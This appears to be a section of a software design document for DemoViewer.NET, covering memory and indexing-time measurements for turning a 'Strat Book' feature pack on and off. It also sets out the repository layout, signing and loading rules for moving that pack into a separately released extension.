**The ~90s drop is real and not queue work, confirmed two ways now.** The GC heap drops about 45 MB between
the two snapshots in every trial. The `Changed` log (stronger evidence than the periodic `Items` poll this
doc originally relied on, which cannot see a job that starts and finishes between polls) shows exactly what
runs: the situation and grenade index `StoreLoad`s and Team Identity's `TeamsCommand` complete within about
2.6s of boot; a `SectionCompute` titled "Lineup clips: plan" (from `GrenadeIndex`'s `Changed` subscription in
`LineupClipService`) fires once around t=3.1s and is gone the very next event, right at the early snapshot;
the 9 demos `RoundFactsEvaluator` still wants sit `Queued` the whole time (confirming §1's "Round Facts runs
on every library index with no switch at all" in practice, and incidentally answering who: it is Round
Facts, not Library, holding them). After that single lineup-clips blip, the log is SILENT for the full ~90s
to the late snapshot in all five trials: no further `Changed` event at all. A plan-only `SectionCompute` is
far too small and far too quick (one event, not a sustained run) to account for 45 MB.

To find out whether the drop is an app-layer effect or something generic, the isolated probe below (no DI
container, no Avalonia, no processing queue, nothing event-driven) got the same 90s-idle-then-resnapshot
treatment. It drops too, by almost exactly the same amount (see below). That rules out anything specific to
this app's queue, Avalonia's dispatcher, or `App.BuildServices`' wiring: whatever is releasing memory does
it to a bare `DemoCacheStore`/`SituationIndex`/`GrenadeIndex`/`TeamIdentityService` graph sitting untouched
in a console-style test host just as readily as to the full app. The likeliest mechanism, not independently
confirmed (that needs a memory profiler, past M0's size): .NET's shared buffer pools
(`System.Buffers.ArrayPool<T>.Shared`, which gzip decompression and JSON deserialization both rent large
scratch arrays from) trim their buckets on an internal timer when a bucket has gone unused for a while,
independent of any GC.Collect call and independent of anything the app's own code does. Both probes decode
gzipped JSON sidecars for 382 demos right before the drop, which fits. Use the EARLY figure as "Pack on"
above: it is the one taken the same way (immediately after settling, no idle period) as the isolated probe's
own first figure, so the two are the comparable pair. The late figure is reported too because it is a real,
reproducible number and item 9 should capture both: if the ~90s drop is this same runtime-level effect
regardless of the pack, it should show up (and by about the same amount) whether the pack is on or off.

**Pack resident cost, isolated** (`PackResidentCostDirect`, no DI container, no `App.BuildServices`): there
is no seam yet to boot with the startup loads skipped, since `App.axaml.cs` runs them unconditionally and
is item 0's hot file at that point. As a narrower, exact substitute, `SituationIndex`, `GrenadeIndex` and
`TeamIdentityService` are constructed directly over a fresh `DemoCacheStore` on the copy (the same
construction `StratMiningCalibration` already uses), each measured by a `GC.GetTotalMemory(true)` delta
around its own load, immediately (no idle period, matching the full-boot probe's "early"); the probe then
takes the same 90s-idle-then-resnapshot second reading, a bare total only (not split per index):

| Trial | SituationIndex | GrenadeIndex | TeamIdentityService | Total (immediate) | Total (after 90s idle) |
|---|---|---|---|---|---|
| 1 | 86.1 MB | 251.8 MB | 4.8 MB | 342.6 MB | 291.3 MB |
| 2 | 86.1 MB | 251.8 MB | 4.8 MB | 342.6 MB | n/a |
| 3 | 86.1 MB | 251.8 MB | 4.8 MB | 342.6 MB | n/a |
| 4 | 86.1 MB | 251.8 MB | 5.0 MB | 342.8 MB | 291.5 MB |
| **median** | **86.1 MB** | **251.8 MB** | **4.8 MB** | **342.6 MB** | **291.4 MB** |

(Trials 1 to 3 predate the late-idle reading, added after the second review round below; trial 4 is the
first run with it. Two late readings is thin for a median, but the two agree to 0.2 MB.) Grenade Index
dominates: `cache/grenade-lineups.json.gz` is 12 MB gzipped, so the live structure runs well over 20x its
compressed size, worth a look if memory becomes a line item later. Immediate-to-immediate, this total is
properly a subset of the full boot's early figure (342.6 MB versus 368.7 MB). After 90s idle, it is ALSO
properly a subset of the full boot's late figure (291.4 MB versus 323.5 MB): the inversion an earlier pass
of this doc reported (342.6 MB "isolated" versus 315.9 MB "full boot", backwards) was comparing an immediate
reading against a reading that had already idled; comparing like with like, in either timing, resolves it.
It still excludes Team Identity's three sibling stores (Strats, Dossier, Veto History; wired by the DI
factory that builds `TeamIdentityService`, not the service itself) and Tag Facts and the Lineup Clip service
(event-driven / render work, not a bulk load), so treat it as a lower bound on the pack's resident cost, not
the whole of it, and prefer the full-boot delta once item 9 can actually toggle the pack off.

**Library index time** (`IndexingTimePerDemo`, 8 of the copy's demos: a discarded warm-up plus 4 timed under
each mode): one retained parse evaluated by all six registered evaluators (library, highlights, round facts,
round index, suggested tags, grenades, the roster `AppCompositionRootTests` pins), each demo's cache record
cleared of its Round Facts, Round Index and Suggested Tags fingerprints and its Highlights analysis state
before timing (bug 2 above, applied in BOTH modes), against one forward parse evaluated by library and
highlights alone, which is the shape the real coordinator already produces (round index, suggested tags and
grenades have no `ForwardFor`, so their presence is what forces the retained parse). Each of the 8 demos
runs under exactly one mode, never both: an early attempt ran both modes on every demo, back to back, and
whichever mode ran second on a given demo came out 5x to 7x faster purely because the OS page cache was
already warm for that file, nothing to do with the evaluator list, so the two modes never share a demo here.
Demos are read in place from the library, never copied or moved; all 8 are within the `match730_*` cluster
at the library's size median (283 to 284 MB). `df ~/Demos` reports an SMB mount (`192.168.1.7:/mnt/user/Demos`,
96% full, 2.1 TB free), not local disk, which is the likely source of most of the per-demo cold-read
variance below: a network share's read latency varies far more than a local SSD's. Three independent
runs on the same copy (each full pass re-forces and rewrites its demos' round index, round facts and
suggested-tags sidecars, so by run 3 those demos are on their third genuine recompute, not a progressively
staler one):

| Run | Full (6 evaluators) median | Reduced (library+highlights) median | Full's overhead over reduced |
|---|---|---|---|
| 1 | 14.38 s | 9.96 s | 4.41 s (44%) |
| 2 | 14.98 s | 8.45 s | 6.53 s (77%) |
| 3 | 16.81 s | 8.97 s | 7.84 s (87%) |
| **pooled median (12 demos/mode)** | **14.53 s** | **9.26 s** | **5.27 s (57%)** |

Per-demo figures, run 1: full 15.35 s, 14.69 s, 14.07 s, 13.32 s; reduced 10.37 s, 9.56 s, 11.21 s, 9.26 s.
Read the pooled figures as "full costs roughly half again as much wall-clock time per demo as reduced", not
as a precise multiplier: the per-run spread (44 to 87%) is wide, dominated by a few individual demos taking
12 to 15s longer than their siblings in the same run and mode, consistent with ordinary cold-read variance
on this machine rather than anything systematic; more runs would narrow it but M0's budget does not cover
that. The reduced pass still evaluates the `round_facts` ruleset internally (`MergedRulesBuild` has not
split it out yet, item 2's job), it just never writes the result, so part of Round Facts' own compute cost
is already inside this "reduced" baseline; once item 2 lands, the reduced number should drop a little for a
reason this measurement did not isolate, and the true overhead of turning the pack off is likely a bit
higher than the 57% here.

### 12.2 Item 2: the merged pass with and without `round_facts`

Item 2 makes `round_facts` a pack contribution, so with the pack off the ruleset leaves the merged set the
Library and Highlights passes run. This measures that one pass, A/B, on the reference demo
(`003816248937665266002_0544286934.dem`, 172 MB, read in place from `demos/benchmarks`), with
`AnalysisBench --bare --no-golden` against the shipped `rules/` directory (A, pack on) and against a copy of
it without `round_facts.rules.yaml` (B, pack off). Three rounds interleaved A B A B A B per the
bench-variance note; medians of 3. macOS arm64, Release, head `a1f6b2d2`, 1-minute load average 5 at start
(an earlier attempt under a load average of 30 to 38 spread 4.6 to 15.3 s across rounds and was discarded).

| Path | Phase | Pack on (A) | Pack off (B) | B vs A |
|---|---|---|---|---|
| `--retained` | Parse | 792.5 ms | 756.5 ms | noise |
| `--retained` | Build | 166.5 ms | 137.9 ms | -17% (every round: 163 to 172 vs 137 to 138) |
| `--retained` | Eval | 3591.7 ms | 3471.3 ms | -3.4% |
| `--retained` | Total (parse+build+eval) | 4560.7 ms | 4366.0 ms | -4.3% |
| forward (default) | Run (open+build+decode+eval) | 3159.8 ms | 3107.2 ms | -1.7% |

Read it as: dropping `round_facts` saves a steady ~30 ms of graph build per demo and a few percent of
evaluation, both inside the round-to-round spread the bench-variance note warns about, so the eval and run
deltas are directional, not quotable. The build saving is the one figure that held in every round. The
rule-chain event table is identical between A and B apart from the `round_facts` stat nodes (B lacks
`money_reliable`), which is the goldens-do-not-move check at the bench level; the test-level check is
`ForwardPassRealDemoTests` and `RoundFactsRealDemoTests` on the same corpus (9 passed, 2 skipped by design).

### 12.3 Item 9: pack off at startup, and the in-session toggle

Reproduced by `tools/strat-book-baseline/run.sh --state on|off|toggle` (new flags; `--state on` with no other
change is M0's own invocation, still against a pack-on copy). The two new `StratBookPackBaselineTests`
probes, `ResidentSetAfterStartup_PackOff` and `IndexingTimePerDemo_PackOff`, reuse M0's boot and snapshot
code but settle on the gate instead of on the pack's readiness flags, which never go true when it is off; a
third probe, `OnThenOffThenOn_InSession`, flips `Features.Overrides["pack.stratbook"]` through the real
`SettingsService.Write` and `PackSwitch`, on the real `IDemoProcessingQueue` (not the Budget test's fake
one), so awaiting `PackSwitch.Pending` waits for the actual "Strat Book: release memory" and startup-load
items to run, not just for them to be submitted. Machine, build and library: same as M0 (macOS arm64,
Release, 382 demos), head `396495e1` (code-identical to `fa77bad5`, the item 8/10 merge point; only
a planning-note commit sits between them). Fresh config copies, made the same way M0's was (the live
config dir minus `lineup-clips/`, `logs/`, `crash.log`, `*.bak`, `.DS_Store`; the same five background
flags forced off): one with no `pack.stratbook` override (resolves on, used for the "pack on, rerun" row's
resident-set and index-time trials) and one with the override set to `false` (for the "pack off" row). A
third, also with no override, was made after the toggle probe gained its `off-late` step (below) to rerun
the toggle trials against the fixed code. Every copy and demo-list file was deleted after the run it was
made for; nothing under `.scratch/` is tracked.

**Resident set, pack off at startup**, 5 trials, same early/late shape as M0's probe:

| Trial | Early working set | Early GC heap | Late working set | Late GC heap |
|---|---|---|---|---|
| 1 | 206.3 MB | 29.60 MB | 116.6 MB | 29.74 MB |
| 2 | 204.7 MB | 29.58 MB | 205.7 MB | 29.72 MB |
| 3 | 201.7 MB | 29.60 MB | 132.7 MB | 29.74 MB |
| 4 | 201.5 MB | 29.62 MB | 202.4 MB | 29.75 MB |
| 5 | 203.8 MB | 29.59 MB | 204.6 MB | 29.73 MB |
| **median** | **203.8 MB** | **29.60 MB** | **202.4 MB** | **29.74 MB** |

Committed bytes read 24.84 MB in every trial, early and late alike (the same "GC is not returning segments"
pattern M0 saw, just at a tenth of the size). The GC heap barely moves at all (29.58 to 29.75 MB across all
ten readings): M0's ~45 MB drop does not recur here, which fits M0's own buffer-pool theory, since a pack
that never loads an index never decodes a gzipped sidecar in the first place, so there is nothing for
`ArrayPool` to trim. The working set is a different story: trial 1 and 3 drop by 90 and 69 MB respectively,
trials 2, 4 and 5 barely move. Trial 1's `@M0_QUEUE_OFF_T+Ns` log (the same 15s poll M0's probe writes)
is empty throughout the 90s, so the drop there is not queue work; trials 2 to 5's logs were not inspected,
only their early/late snapshot lines (`run_off_trials.sh` greps those). Working-set noise with no GC-heap
counterpart matches the pre-existing bench-variance scar for this machine and is reported as noise, not a
finding confirmed on every trial.

**Resident set, pack on, rerun at this head**, 5 trials:

| Trial | Early working set | Early GC heap | Late working set | Late GC heap |
|---|---|---|---|---|
| 1 | 417.1 MB | 369.87 MB | 422.2 MB | 374.84 MB |
| 2 | 417.7 MB | 369.90 MB | 330.4 MB | 324.60 MB |
| 3 | 420.5 MB | 369.91 MB | 423.1 MB | 374.86 MB |
| 4 | 417.0 MB | 369.93 MB | 420.6 MB | 374.89 MB |
| 5 | 415.4 MB | 369.90 MB | 353.5 MB | 324.57 MB |
| **median** | **417.1 MB** | **369.90 MB** | **420.6 MB** | **374.84 MB** |

The early GC heap (369.90 MB) matches M0's 368.7 MB closely, the small difference plausibly just the code
that landed between M0 and here (items 1 to 8, 10, 19). The late figure is the surprise: M0 saw the ~45 MB
drop in five of five trials; here it recurs in exactly two (trials 2 and 5, down to 324.6 MB, the same
magnitude M0 measured), while the other three rise slightly instead (to ~374.8 to 374.9 MB). The late
median therefore sits above the early median, the opposite of M0's table. Nothing about the probe changed
between M0 and this rerun (same code path, same copy shape); the likeliest read is that the drop is a
runtime-level buffer-pool trim gated by a timer or an unused-bucket threshold that this 90s window sometimes
catches and sometimes does not, which is consistent with it being independent of the app (M0's own isolated
probe) rather than deterministic. Treat M0's "always drops" framing as itself a small-sample artifact (5 of
5 trials is not enough to rule out exactly this split happening the other way) rather than conclude the
mechanism changed. One fact cuts the other way, though: the toggle probe's `off-late` reading below
trimmed in all 3 of 3 trials, not 2 of 5. If both readings are catching the same timer, something kept on
by the pack while it is running (nothing of the pack is attached in the pure pack-off boot, everything is
attached in the pack-on boot this split happened under) may be what makes the trim land inconsistently
here but reliably once the pack is off, rather than the trim itself being a coin flip.

**Library index time, pack off**, 8 demos (library + highlights only; this is now the real evaluator list
with the pack off, not a probe choosing a mode): 9453.8, 8936.9, 10233.9, 9030.8, 9401.9, 9613.2, 9147.7,
9991.0 ms; median 9427.9 ms. `MergedRulesBuild.EnabledDoc("round_facts")` is null for the whole run,
confirming item 2's split actually holds under the real gate, not just under `AnalysisBench`'s A/B in §12.2.

**Library index time, pack on, rerun**, 4 demos full / 4 reduced (the same split M0 used, pack on
throughout, so the reduced arm here still carries `round_facts`'s own compute cost per M0's original
caveat): full median 13539.2 ms, reduced median 7688.8 ms (76% slower full, inside M0's 44 to 87% spread).

**The pack-passes-add-X% figure, with a real after-state, and a noise caveat.** M0 could only compare
"full" against a "reduced" arm that still ran `round_facts` internally (item 2 had not landed), so its 57%
figure was always going to undercount. Comparing the pack-on rerun's full arm (13539.2 ms) against the
pack-off row's second run (9427.9 ms, measured on a different 8 demos from the same size-median cluster,
not the same ones, see "method deltas" below) gives 43.6% overhead, i.e. the pack's four evaluators plus
Grenade Index's walk cost about 4111 ms per demo of this size on this machine, inside M0's spread. Treat it
as a point estimate, not a tight bound: the pack-off row's two runs over the identical 8 demos landed at
9162.8 ms and 9427.9 ms, 2.9% apart, but the pack-on rerun's reduced arm (still running `round_facts`
internally, just not writing it) came in at 7688.8 ms, 1.47 to 1.74 s FASTER than the pack-off row despite
doing strictly more work. Per §12.2 `round_facts` itself costs only a few percent, nowhere near 1.7 s, so
demo-to-demo and SMB-read noise on this machine is at least as wide as the gap between 43.6%, M0's 57% and
the in-run 44 to 87% spread; the 43.6% figure is a real improvement over M0's (a true pack-off denominator
instead of one still carrying `round_facts`), but it is not more precise than M0's, just less biased.

**On, then off, then on again, in one process**, 3 trials, real queue. The first pass through this probe
(before it had an `off-late` step) measured on-before/off/on-again only and got a confusing result: off
landed at 84.1 MB (54.5 MB above the pack-off-at-startup row's 29.6 MB) and on-again landed at a median of
422.1 MB, 52.2 MB above on-before in two of three trials. Both looked like real pack costs. Adding a 90s
idle wait and a second collect between "off" and the re-enable, the same window `ResidentSetAfterStartup`
uses, resolves both:

| Trial | on-before GC heap | off GC heap (immediate) | off GC heap (after 90s idle) | on-again GC heap |
|---|---|---|---|---|
| 1 | 370.17 MB | 84.41 MB | 31.47 MB | 369.73 MB |
| 2 | 369.88 MB | 84.10 MB | 31.19 MB | 369.32 MB |
| 3 | 369.86 MB | 84.10 MB | 31.21 MB | 369.44 MB |
| **median** | **369.88 MB** | **84.10 MB** | **31.21 MB** | **369.44 MB** |

**The 84.1 MB immediate figure is transient, not retained pack state.** After 90s of idle (no
further gate changes, nothing else running) the same process's heap drops to 31.2 MB, 1.6 MB above the
pack-off-at-startup row's 29.6 MB, close enough to call it the same floor; committed bytes drop with it, to
a median of 24.7 MB, matching the pack-off-at-startup row's 24.8 MB almost exactly. This is the same ~45 to
55 MB scale M0 attributed to a buffer-pool trim on decode, and the timing fits that reading (the release
itself does the real work: `SituationIndex`, `GrenadeIndex` and Team Identity all report not ready/not
loaded the instant the release item completes, before any idle wait), but the probe only shows that
whatever lingers is gone within 90s, not what specifically holds it until then. Decision 3 ("no reclaimed
on restart") holds either way: the heap does go back to where it was, just not within the first few
seconds.

**Re-enabling from a settled state costs about the same as the first enable, not more.** on-again (369.44
MB median) sits 0.44 MB below on-before (369.88 MB), well inside the trial noise the pack-on rerun's own
early/late split already showed (±45 to 50 MB with nothing but idle time passing). The earlier 3-trial
run's "52.2 MB more to re-enable" is consistent with flipping the pack back on before the pool had
trimmed, so the reload's own allocations landed on top of memory that was about to be freed anyway, but
three trials against three cannot cleanly separate that from the same noise, only make it the likelier
reading. `StratBookLiveToggleTests.OnThenOff_ReturnsTheHeap_ToWhereItWasBeforeTheEnable`
(`[Category("Budget")]`, synthetic 160-demo fixture, fake `InlineQueue`, no idle wait between cycles)
reports a sub-1-MB residual after its first off-on-off cycle; one plausible mechanism, not confirmed here,
is a GC-triggered buffer-pool trim keyed to how long a rented buffer has sat unused, in which case three
collects taken immediately would see only recently-rented buffers and free little, while a collect after
90s would see the same buffers past whatever age threshold frees them, and the synthetic fixture rents
little either way so its residual is small regardless of timing.
Working set in the second pass (medians): on-before 415.0 MB, off 383.7 MB, off-late 171.4 MB, on-again
379.7 MB. Off-late's working set is noisy in exactly the way the pack-off-at-startup row's was (this run's
three trials: 218.3, 140.2 and 171.4 MB), the same GC-heap-flat-but-working-set-noisy pattern repeating.

Library index time was not measured inside the toggle probe: the pack-off row above already answers "what
does indexing cost with the pack off", and parsing demos inside the same process that the three resident
readings share would pollute their JIT and GC history for no new number.

**Method deltas from M0, and two caveats.** The index-time demo lists for the on-rerun and
off rows are disjoint from EACH OTHER (no filename appears in both), both from the same size-median
`match730_*` cluster M0 used (not M0's exact 8: the library has 381 to 382 entries depending on exactly
when it is counted, and M0's doc did not record filenames, only the selection rule).

1. A "Stale NFS file handle" on the `192.168.1.7` mount failed the on-rerun probe three times running,
   each time on a different file (`...1162819269_392.dem` twice, then `...1246116093_405.dem`), neither
   reproducing a `dd` read taken seconds apart on the same file; several demos already used successfully
   in the pack-off run were also momentarily unreadable by `dd` during the same session, then readable
   again, so this is believed transient, not a change anyone made. The fourth attempt, rebuilding the
   whole list from a fresh `dd`-verified readable set, succeeded and is what the doc reports.
2. That rebuild excluded every filename already in the off-row's list, but not the three earlier (failed)
   versions of its own list, so 4 of its 9 lines came back around, each read 1 to 3 times before this
   final pass: `...0380373016_406` (the discarded warm-up in all three failed attempts, scored "reduced"
   here, 7295.2 ms) and `...1857131197_392` (scored "reduced" three times before, scored "reduced" again
   here, 7676.5 ms) are the two FASTEST of the four reduced times, both faster than the two genuinely
   fresh reduced demos (7701.2, 8949.0 ms), which does look like a real warm-cache effect and means the
   reduced median (7688.8 ms) used above is probably a little low. `...0400436477_410` (scored "full"
   three times before, "full" again here, 15357.5 ms) is the SLOWEST of the four full times, and
   `...0155597527_407` (scored "reduced" once before, "full" here, 13340.7 ms) sits near the middle, so
   the full arm shows no comparable speedup. Net effect: the 76% "full slower than reduced" figure for
   the on-rerun likely overstates the gap a little (a fresh reduced arm would probably land above 7688.8
   ms), which is a second, independent reason the 43.6% pack-passes figure above is a point estimate, not
   a tight bound, on top of the demo-to-demo noise already named there.

The off row's list, by contrast, was read twice on purpose (not a mistake): `IndexingTimePerDemo_PackOff`
ran clean the first time too, giving two independent passes over the identical 9 lines, 9162.8 ms and
9427.9 ms median, 2.9% apart. That agreement is a real same-list repeat-read comparison; the on-rerun's
internal consistency cannot be read the same way; see the "pack-passes-add-X%" note above for why the two
are then still compared across each other for the headline percentage. One run per state used for the
reported numbers, two for the off row (not M0's three throughout): the time budget for this item did not
stretch to three full index-time passes on top of ten resident-set trials, six toggle trials and a code
change mid-session.

## 13. Repository layout (decision 5)

After Phase 0b, inside the app project, with namespaces unchanged:

```
src/App/DemoViewer.NET/Extensions/StratBook/
  StratBookPack.cs                      the IFeaturePack
  Modules/     StratBook, UtilityBook, RoundTagger, SuggestedTags, Situations, Dossier, Teams, Review
  Services/    Strats, RoundIndex, RoundFacts, Tags, Teams, Provenance
  ViewModels/  StratBook, UtilityBook, Situations, Dossier, RoundTagger, SuggestedTags, Teams, Review
  Views/       StratBook, UtilityBook, Situations, Dossier, RoundTagger, SuggestedTags, Teams, Review
  Controls/    PlaceField.axaml(.cs), PlaceFieldModel.cs
  Assets/      Palettes (tag-store.md §3.4), Callouts (strat-model.md §3.7)
src/App/DemoViewer.NET.App.Tests/Extensions/StratBook/
src/App/DemoViewer.NET.UiCapture/Extensions/StratBook/
```

Item 0b's actual move list differs from the draft above it replaced. `Services/Provenance` moved whole:
decision 1 names it explicitly, even though `MainViewModel` and `LibraryTabViewModel` keep forward
references into it, the same shape as the Teams and Round Facts edges the decision also accepts as
pre-existing and leaves for items 2, 4 and 22 to cut. `Services/Review` did not move at all: `ReviewQueue`
and `ReviewQueueMigration` are both core (Highlights is a consumer), so nothing in that folder is
pack-owned; the pack side of Review is `Modules/Review`, `ViewModels/Review` and `Views/Review` (the hub
section and its tab), which did move. The ViewModels and Views lists grew from the draft's partial set to
the full eight sections, matching Modules. `Services/Zones` stays core: core code outside the Strat Book
set consumes it (`RuleWorkbenchTabViewModel`, `Playback2DTabViewModel`, and `App.axaml.cs`'s composition
root), not only the two ring-G viewmodels a narrower grep would suggest.
`ViewModels/Settings/SuggestedTagsTuningViewModel.cs` also stays where it is for now, even though it is
pack-owned by the ring table: `SettingsViewModel`'s constructor takes it, and that seam is item 14's to
cut, not a rename item's.

After Phase 5 (item 25, as built):

```
src/Extensions/StratBook/
  DemoViewer.NET.Extensions.StratBook/              the csproj; references src/App/DemoViewer.NET
    DemoViewer.NET.Extensions.StratBook.csproj      RootNamespace DemoViewer.NET; AssemblyName DemoViewer.NET.Extensions.StratBook
    AssemblyInfo.cs                                 InternalsVisibleTo App.Tests and UiCapture
    StratBookPack.cs, StratBookLifecycle.cs, ...    the pack root files
    Modules/ Services/ ViewModels/ Views/ Controls/ Assets/   the Phase 0b tree, moved whole, namespaces unchanged
    Services/Zones/AssetZonePlaceResolverSource.cs  the one file that moved in from core (it implements a pack interface)
    Playback2D/Input/TokenTool.cs                   item 26: moved in, namespace DemoViewer.NET.Extensions.StratBook.Playback2D.Input
    Playback2D/Layers/GuideLayer.cs                 item 26: moved in, namespace DemoViewer.NET.Extensions.StratBook.Playback2D.Layers
    Playback2D/Frames/StratFrameSource.cs, StratSceneSpec.cs   item 26: moved in, namespace ...Playback2D.Frames
    Playback2D/Hud/StratHudDataSource.cs            item 26: moved in, namespace ...Playback2D.Hud
    Playback2D/Keyframes/StepSchedule.cs, TokenKeyframe.cs, TokenTrack*.cs   item 26: moved in, namespace UNCHANGED (DemoViewer.NET.Playback2D.Core.Keyframes; nothing in Core used it)
  DemoViewer.NET.Extensions.StratBook.Tests/        item 28: RootNamespace DemoViewer.NET.AppTests (the App.Tests one)
    *.cs                                             flat, no subfolders: 182 files item 28 moved whole or split
                                                       out, plus item 26's StepScheduleTests, StratFrameSourceTests,
                                                       TokenTrackTests and TokenToolTests (moved a second time,
                                                       App.Tests/Extensions/StratBook/Playback2D/ to here), and
                                                       TokenToolHostTests (split out of Scene2DHostFrameHostTests,
                                                       which stayed in App.Tests)
    RoundIndexTestData.cs, CacheRecordTestExtensions.cs, StratBookHubAccess.cs, ToleranceSliderHarness.cs
                                                       linked back into App.Tests: core tests use them as fixtures
  extension.json                                    the manifest template (items 33 and 39, section 7.7); stamped, embedded and copied beside the DLL
  version.json                                      item 39: the extension's own Nerdbank.GitVersioning file (0.1, pathFilters on this directory)
src/Extensions/ExtensionManifest.targets            item 39: the stamping target every extension csproj imports
src/App/DemoViewer.NET.App.Tests/Extensions/PackBoundaryTests.cs   pack-agnostic; pulled out of the item 28 move
src/App/DemoViewer.NET.UiCapture/Extensions/StratBook/      the pack's capture variants; item 28 did not touch this
src/App/DemoViewer.NET/Extensions/Loading/        the loader (item 34, section 7.8) and the signing and
                                                   trust seam (item 35, section 7.9: ExtensionSignature.cs,
                                                   PublisherKeys.cs, SignedTrustPolicy.cs); the app, so
                                                   every head can use it
src/App/DemoViewer.NET/Extensions/Updates/        the feed, the updater and the staging rules (item 36, section 7.10)
src/App/DemoViewer.NET/ViewModels/Settings/ExtensionUpdateRow.cs   the update line under an extension's Settings row
tools/extension-signing/          item 35's signing tool (section 7.9), item 37's packaging commands added
                                   (section 7.11: report, manifest, zip, feed-merge, feed-check) and
                                   DeterministicZip.cs/FeedMerge.cs; outside the .slnx; links source from
                                   the app (Extensions/Loading, Extensions/Manifest, Extensions/Updates)
                                   rather than referencing it
scripts/pack-extension.sh         item 37: build, stage, sign, zip and feed entry for one extension release
.github/workflows/release-extension.yml   item 37: the release workflow (section 7.11)
```

At run time, under the config root (`AppPaths.ConfigRoot`), item 36 stages what item 34 loads:

```
<config root>/extensions/<id>/<version>/          one staged extension version; read by the Desktop head at startup
  extension.json                                  id and version equal to the folder names
  extension.sig                                   item 35's detached signature over everything else here, as it came out of the zip
  DemoViewer.NET.Extensions.StratBook.dll         the assembly the manifest names
<config root>/extensions/.staging/<id>/           item 36's work in progress; skipped by the loader, removed at the next start
  <version>.zip.part                              the download, verified against the feed's size and sha256
  <version>/                                      the unpacked copy, judged by the trust policy, then renamed into place
```

Item 26's namespace rule: a moved type keeps its original namespace when the move vacates that namespace
entirely from Core/Pipeline (`Keyframes`: nothing else lived there); it takes an extension-owned namespace
(`DemoViewer.NET.Extensions.StratBook.Playback2D.<Area>`) when a sibling stays behind under the same
namespace and core app files import it for that sibling (`Input`: `DrawTool`/`EraseTool`/the router stay;
`Layers`: `MarkerLayer`/`RadarLayer`/etc. stay; `Pipeline.Frames`: `TrackerFrameSource`/`FixtureFrameSource`
stay; `Pipeline.Hud`: `TimelineHudDataSource`/`KillFeedTimeline` stay). Keeping the old namespace there would
make `PackBoundaryTests`' pack-owned-namespace scan flag every one of those unrelated App files as a false
edge. `ITokenEditor`, `TokenGrip`, `TokenHitTest`, `SceneGuides`, `TokenRouteLine`, `Scene2DFrame.Routes` and
`ScenePalette.Route*` are not moved at all: see 3.3.

Rules as built:

- **The app references no extension.** `src/App/DemoViewer.NET/DemoViewer.NET.csproj` has no project
  reference under `src/Extensions/`; the compiler enforces the boundary and `PackBoundaryTests` asserts the
  csproj so a reference cannot be added quietly. The extension references the app. The heads (Desktop,
  Browser), `DemoViewer.NET.App.Tests` and `DemoViewer.NET.UiCapture` reference both.
- **Composition.** `FeaturePacks.Default` is empty until the head calls
  `FeaturePacks.Configure([new StratBookPack()])`, which both heads do before Avalonia starts, UiCapture does
  on its first line and the test assembly does from a module initializer (`CompiledInPacks`). Since item 33
  `Configure` judges each pack against `ExtensionHost.Current` as it sets the list (section 7.7), and the
  readers take the subset that passed: `FeatureCatalog`, `JobKindRegistry.Default`, `CommandRegistry.Default`,
  the `ViewLocator` and `App.BuildServices(windowService)` all read `FeaturePacks.Compatible`; `Default` is the
  declared list and `Statuses` the verdicts, which Settings reads. The list freezes on first read of any of
  the three because the registries build from it once; a second or late `Configure` throws (`FrozenList<T>`,
  pinned by `FeaturePacksTests`). Each head's `BuildAvaloniaApp` also calls `FeaturePacks.ConfigureIfUnset`
  with the same list, a no-op after Main, because the XAML previewer calls that method without running Main.
  The tests that build the composition root are unchanged, and the pack-off tests override the gate rather
  than the list.
- **InternalsVisibleTo.** The app grants `DemoViewer.NET.Extensions.StratBook` (decision 5 option (b): a
  first-party extension composes over the same internal seams the app's own composition root uses; Phase
  6's loader loads only first-party signed assemblies, so this exposes nothing to third parties) and, since
  item 28, `DemoViewer.NET.Extensions.StratBook.Tests` (the same internal seams App.Tests reaches). The
  extension grants `DemoViewer.NET.App.Tests`, `DemoViewer.NET.UiCapture` and
  `DemoViewer.NET.Extensions.StratBook.Tests`. **Item 26** adds a second grantor: `DemoViewer.NET.Playback2D.Core`
  also grants `DemoViewer.NET.Extensions.StratBook`, because the strat frame source (moved there) writes
  `Scene2DFrame`'s internal backing fields directly, the pooled-refill pattern `SceneFrameBuilder` itself
  uses; `Scene2DHost.AddTool`/`AddLayer`/`FrameHost` stay covered by the app's existing grant. No core
  member was widened to public for the split.
- **Views.** `ViewLocator` keeps the naming convention and, when `Type.GetType` finds nothing in the app
  assembly, asks each compatible pack's assembly (`pack.GetType().Assembly.GetType(name)`). Pack views
  carry no `avares://` URI and no `assembly=` xmlns today; theme tokens stay in the app (section 7.4).
- **Shared namespaces.** `DemoViewer.NET.Services.RoundFacts` (models and `IRoundFactsSource` in core,
  `RoundFactsSource` and the evaluator in the pack), `DemoViewer.NET.Services.RoundIndex`
  (`RoundIndexTokenSource` in core, the index in the pack) and `DemoViewer.NET.Services.Zones` (Zone Baking in
  core, the resolver source in the pack) are declared by both assemblies. `PackBoundaryTests` treats a
  namespace both declare as shared and scans core only for the pack-owned ones.
- **Resources.** The palettes and callouts are `EmbeddedResource`s of the extension under the logical names
  they always had (`DemoViewer.NET.Services.Tags.Palettes.*`, `DemoViewer.NET.Services.Strats.Callouts.*`);
  `TagPaletteStore` and `CanonicalPlaces` read `typeof(...).Assembly`, which is now the extension.
- **Publishing.** The heads reference the extension, so `dotnet publish` of a head ships
  `DemoViewer.NET.Extensions.StratBook.dll` beside the app with no script change; `scripts/publish.sh` and
  the release workflow are unchanged.
- **The extension's own release (item 37).** A separate workflow, `release-extension.yml`, and a separate
  script, `scripts/pack-extension.sh`, cut and publish one extension version independently of an app
  release; `release.yml` itself is untouched, since the app installer still bundles whichever extension
  version the heads reference at the time the app is released. `ExtensionPackagingTests` (App.Tests) links
  `tools/extension-signing/FeedMerge.cs` the same way four item 28 fixtures are linked the other direction,
  so the rolling feed's merge rules are tested in C#, not only exercised through the CLI. Section 7.11 has
  the rest.

What stays in the app: everything ring G in section 3 (lanes, shape tools, `MapSceneHost`, zones,
`QueueWork`, the processing queue) and the Review Queue (decision 1). Ring S items move with the
extension once their contribution seams exist (items 2, 22). Which `Services/` folders are pack-only
versus shared is settled by item 0b's move list, reviewed before the move.
